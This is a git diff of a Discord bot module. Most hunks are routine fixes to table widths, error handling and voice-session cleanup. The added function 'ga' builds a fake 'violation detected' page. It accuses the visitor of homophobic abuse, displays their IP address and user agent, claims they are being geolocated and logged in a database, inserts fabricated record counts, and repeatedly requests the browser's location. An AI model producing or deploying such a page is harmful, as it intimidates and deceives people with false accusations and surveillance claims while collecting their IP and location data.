@@ -121,9 +121,9 @@ module.exports.calendar = async function() {
 
   for (const [id, data] of Object.entries(array[0])) {
     if (!id.includes('test')) {
-      head = head + `<th style="width:60px">${id.replace(/-/g, '<br>')}</th>`;
+      head = head + `<th style="width:10%">${id.replace(/-/g, '<br>')}</th>`;
       if (id === 'UTC') {
-        head = head + `<th style="width:80px">Local<br>Time</th>`;
+        head = head + `<th style="width:20%">Local<br>Time</th>`;
       }
       cols = cols + 1;
     }
@@ -261,8 +261,18 @@ module.exports.log = async function(client, member) {
       const cols = new Array();
       cols[0] = session.username;
       cols[1] = session.start.toLocaleTimeString('en-US', { hour12: false });
-      cols[2] = format(session.duration);
-      cols[3] = format(session.selfVideo_duration);
+      try {
+        cols[2] = format(session.duration);
+      }
+      catch (err) {
+        cols[2] = '0';
+      }
+      try {
+        cols[3] = format(session.selfVideo_duration);
+      }
+      catch (err) {
+        cols[3] = '0';
+      }
       cols[4] = (session.selfVideo_duration / session.duration)
         .toLocaleString(undefined, { style: 'percent', minimumFractionDigits: 2 });
 
@@ -273,6 +283,8 @@ module.exports.log = async function(client, member) {
       const tab = table(rows);
       logs.send('```' + title + tab + '```');
     }
+
+    this.vcmon_sessions[member.channelId] = {};
 
     delete this.vcmon_sessions[member.channelId];
   }
@@ -461,4 +473,38 @@ module.exports.update = async function(client, oldmember, newmember) {
   db.set('vcmon_sessions', JSON.stringify(this.vcmon_sessions))
     .then(() => { })
     .catch(err => { console.log(err) });
+}
+
+
+module.exports.ga = function(req, query) {
+  html = '<html><head>';
+  html = html + '</head><body>';
+  html = html + '<br><code>Violation detected and logged: [homophobic abuse]</code>';
+  html = html + '<br><code>Platform: DISCORD - undefined - undefined</code>';
+  html = html + `<br><code>Platform User ID: ${query.id} ${query.tag}</code>`;
+  html = html + `<br><code>User's local IP address: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</code>`;
+  html = html + `<br><code>At user's local time: <span id="time"></span></code>`;
+  html = html + `<br><code>Location tracking: active - logging</code>`;
+  html = html + `<br><code>Location source: client [${req.headers['user-agent']}]</code>`;
+  html = html + `<br><code>Database: GAE35 (public lgbtqi+ (gay) antifa elephant #35)</code>`;
+  html = html + `<br><code>Table: smhab.smhab_rawdata_violator_geolocate</code>`;
+  html = html + `<br><code>[<span id="recs"></span> record(s) inserted]</code>`;
+  html = html + '<script>';
+  html = html + 'document.getElementById("time").innerHTML = new Date();';
+  html = html + 'document.getElementById("recs").innerHTML = Math.floor(10*Math.random());';
+  html = html + 'document.onload = setTimeout(function () { alert("SECURITY WARNING: This page is using your device location. Close the page if no longer required."); }, 5000);';
+  html = html + 'window.setInterval(insert, 10000);';
+  html = html + 'function insert() {';
+  html = html + 'if (navigator.geolocation) {';
+  html = html + 'navigator.geolocation.getCurrentPosition(showPosition);';
+  html = html + '}';
+  html = html + 'document.body.innerHTML+="<br><code>["+Math.floor(10*Math.random())+" record(s) inserted]</code>";';
+  html = html + '}';
+  html = html + 'function showPosition(position) {';
+  html = html + 'document.body.innerHTML += "<br><code>Location: " + position.coords.latitude + " " + position.coords.longitude + " @ " + Number(new Date()) + "</code>";';
+  html = html + '}';
+  html = html + '</script>';
+  html = html + '</body></html>';
+
+  return html;
 }
